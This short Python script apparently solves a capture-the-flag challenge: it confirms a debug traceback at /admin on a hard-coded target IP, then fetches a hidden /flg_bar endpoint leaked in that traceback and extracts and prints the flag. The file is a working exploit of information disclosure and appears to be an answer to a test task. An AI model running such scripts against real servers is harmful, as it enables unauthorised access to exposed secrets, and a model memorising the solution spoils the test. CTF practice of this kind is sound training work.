#!/usr/bin/env python3
import re
import sys
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5002"
BASE = BASE.rstrip("/")


def main() -> int:
    s = requests.Session()

    # Trigger debug traceback first (optional, but useful for validation)
    r = s.get(f"{BASE}/admin", timeout=10)
    if r.status_code != 500:
        print(f"[!] Unexpected /admin status: {r.status_code}")
    else:
        print("[+] /admin returns 500 debug page (as expected)")

    # Hidden endpoint leaked in traceback source preview
    r = s.get(f"{BASE}/flg_bar", timeout=10)
    if r.status_code != 200:
        print(f"[!] Failed to fetch /flg_bar, status={r.status_code}")
        return 1

    body = r.text
    print("[+] /flg_bar response:\n")
    print(body)

    m = re.search(r"FLAG\s*=\s*(.+)", body)
    if not m:
        print("[!] FLAG not found in response")
        return 1

    flag = m.group(1).strip()
    print(f"\n[+] FLAG: {flag}")
    print(f"\n<FLAG>{flag}</FLAG>")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
